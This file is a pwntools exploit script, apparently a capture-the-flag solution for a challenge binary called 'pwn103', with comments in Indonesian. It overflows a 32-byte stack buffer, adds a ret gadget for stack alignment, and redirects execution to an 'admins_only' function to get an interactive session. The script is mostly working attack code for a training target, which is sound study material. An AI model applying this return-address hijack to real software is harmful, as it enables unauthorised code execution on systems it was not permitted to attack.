#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pwn103.pwn103
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = binary = ELF(args.EXE or 'pwn103.pwn103')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# mendapatkan ret address
admins_only_address = p64(binary.symbols.admins_only)

# ret address tambahan untuk baypass intstruksi MOVAPP yang menyebabkan segfault
retaddress = p64(0x00401377)

# craft payload
payload = b'A'*0x20 + b'B'*0x8 + retaddress + admins_only_address

print("[!]Payload = " + str(payload))

# mengirim payload
io.sendlineafter("Choose the channel: ", b"3")

io.sendlineafter("------[pwner]: ",payload)
print("[!]Payload terkirim! :)")


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

